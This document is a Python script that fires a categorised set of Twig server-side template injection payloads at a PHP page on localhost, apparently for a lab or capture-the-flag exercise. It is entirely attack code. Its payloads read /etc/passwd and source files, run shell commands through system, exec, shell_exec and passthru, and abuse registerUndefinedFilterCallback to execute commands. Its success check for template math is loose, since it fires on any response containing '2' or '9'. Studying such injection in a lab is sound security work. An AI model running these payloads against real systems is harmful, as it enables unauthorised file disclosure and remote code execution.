import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n
def test_payload(payload):
    url = 'http://127.0.0.1:8080/index.php'
    data = {'name': payload}
    try:
        r = requests.post(url, data=data, verify=False, timeout=5)
        return r.status_code, r.text
    except Exception as e:
        return 0, str(e)

# Payload categories
categories = {
    'A_Basic_Math': [
        ('{{7*7}}', 'should show 49'),
        ('{{1+1}}', 'should show 2'),
        ('{{3*3}}', 'should show 9')
    ],
    'B_Object_Refs': [
        ('{{_self}}', 'self object'),
        ('{{_self.env}}', 'self.env'),
        ('{{_context}}', 'context'),
        ('{{GLOBALS}}', 'globals')
    ],
    'C_Template_Methods': [
        ('{{_self.env.getFilters()}}', 'env filters'),
        ('{{_self.env.getFunctions()}}', 'env functions'),
        ('{{_self.template}}', 'template'),
        ('{{_self.template.getClassName()}}', 'template class')
    ],
    'D_File_Access': [
        ('{{file_exists("/etc/passwd")}}', 'file_exists test'),
        ('{{file("/etc/passwd")}}', 'file read'),
        ('{{readfile("/etc/passwd")}}', 'readfile'),
        ('{{file_get_contents("index.php")}}', 'get_contents index'),
        ('{{include("index.php")}}', 'include index')
    ],
    'E_Command_Exec': [
        ('{{system("id")}}', 'system id'),
        ('{{exec("id")}}', 'exec id'),
        ('{{shell_exec("id")}}', 'shell_exec id'),
        ('{{passthru("id")}}', 'passthru id'),
        ('{{"id"|system}}', 'filter system'),
        ('{{"whoami"|system}}', 'filter whoami')
    ],
    'F_Attribute_Reflection': [
        ('{{attribute(_self, "env")}}', 'attribute env'),
        ('{{attribute(app, "request")}}', 'attribute app'),
        ('{{attribute(_self, "template")}}', 'attribute template'),
        ('{{_self.env.registerUndefinedFilterCallback("exec")}}', 'callback filter'),
    ]
}

# Test all payloads
print("TWIG SSTI TESTING - POST to http://127.0.0.1:8080/index.php")
print("=" * 70)

for cat_name, payloads in categories.items():
    print(f"\n[CATEGORY {cat_name}]")
    print("-" * 70)
    
    for payload, desc in payloads:
        status, response = test_payload(payload)
        print(f"\nPayload: {payload}")
        print(f"Description: {desc}")
        print(f"Status: {status}")
        print(f"Response (first 200 chars): {response[:200]}")
        
        if '49' in response or '2' in response or '9' in response:
            print("[+] MATH EXECUTED")
        if 'Array' in response:
            print("[+] ARRAY RETURNED")
        if payload in response:
            print("[!] PAYLOAD RETURNED UNCHANGED (likely escaped)")
        if len(response.strip()) > 0 and len(response.strip()) < 50:
            print(f"[+] CLEAN OUTPUT: {response.strip()}")

print("\n" + "=" * 70)
print("Testing complete - analyze patterns above")
